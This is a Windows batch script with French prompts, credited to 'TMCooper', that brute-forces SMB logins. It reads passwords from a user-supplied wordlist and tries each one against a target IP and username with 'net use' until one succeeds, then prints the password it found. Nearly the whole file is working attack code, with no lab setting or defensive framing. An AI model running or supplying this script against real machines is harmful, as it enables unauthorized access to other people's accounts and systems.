@echo off
rem -------------------------
rem Bruteforce - by TMCooper 
rem -------------------------
setlocal enabledelayedexpansion

:: ----- En-tête ASCII -----
color 0A
echo.
echo  ==================================================
echo  ^|^|      B R U T E F O R C E   S C R I P T       ^|^|
echo  ==================================================
echo.
color 0B

:: ----- Entrées utilisateur -----
set /p wordlist="Le chemin de votre wordlist : "
:: Ou juste le nom si la wordlist est dans le même dossier
set /p ip="Entrer l'adresse IP (cible) : "
:: Adresse de la cible
set /p user="Entrer le nom d'utilisateur : "
:: Nom d'utilisateur que vous souhaité brutforce

if not exist "%wordlist%" (
  echo.
  echo [ERREUR] Le fichier "%wordlist%" est introuvable.
  echo Placez la wordlist dans le même dossier que ce script ou renseignez le chemin complet.
  pause
  exit /b 1
)

echo.
echo Lancement des essais sur \\%ip% avec l'utilisateur %user%...
echo (pour arreter proprement depuis une autre console : créez un fichier nommé stop.txt dans ce dossier)
echo.

:: ----- Variables -----
set /a count=1

:: ----- Boucle sur la wordlist (gestion des espaces) -----
for /f "usebackq delims=" %%a in ("%wordlist%") do (
    set "password=%%a"
    if "!password!"=="" (
        rem ignorer ligne vide
        set /a count+=1
    )

    rem tentative de connexion
    echo [ESSAIE !count!] -- !password!
    net use \\%ip% /user:%user% "!password!" >nul 2>&1

    if !errorlevel! EQU 0 (
        echo.
        color 0A
        echo [OK] Mot de passe trouvé : !password!
        echo Nettoyage en cours...
        net use \\%ip% /d /y >nul 2>&1
        pause
        exit /b 0
    )

    :nextiter
    set /a count+=1
)

:: ----- Si on arrive ici, pas de mot de passe trouvé -----
color 0C
echo.
echo Mots de passe non trouvés...
net use \\%ip% /d /y >nul 2>&1
pause
endlocal
exit /b 0
